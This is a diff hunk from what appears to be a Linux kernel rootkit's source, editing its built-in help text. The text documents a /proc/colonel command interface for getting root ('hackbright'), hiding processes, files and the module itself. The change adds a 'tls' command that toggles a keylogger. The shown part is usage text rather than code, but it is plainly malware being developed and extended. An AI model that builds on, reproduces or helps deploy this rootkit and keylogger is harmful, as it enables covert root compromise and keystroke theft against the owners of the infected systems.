@@ -140,17 +140,18 @@ DESCRIPTION:\n\
   hides files prefixed with __rt or 10-__rt and gives root access\n\n\
 USAGE:\n\
   From command line --\n\
-  echo -n <command> >> /proc/colonel\n\
+  $ echo -n <command> >> /proc/colonel\n\n\
   From rtcmd --\n\
-  ./rtcmd.py hp1337\n\
+  $ ./rtcmd.py hp1337\n\n\
   To get root access, give the \"hackbright\" command and\n\
   then fork some shell from writing process.\n\
   rtcmd.py does this if the second parameter is specified. --\n\
-  ./rtcmd.py hackbright /bin/bash\n\n\
+  $ ./rtcmd.py hackbright /bin/bash\n\n\
 COMMANDS:\n\
   hackbright	- uid and gid 0 for writing process\n\
   hpXXXX		- hides process id XXXX\n\
   sp 			- shows last hidden process\n\
+  tls			- toggles keylogger on/off\n\
   thf			- toggles hidden files\n\
   mh 			- hide module\n\
   ms 			- show module\n\n\
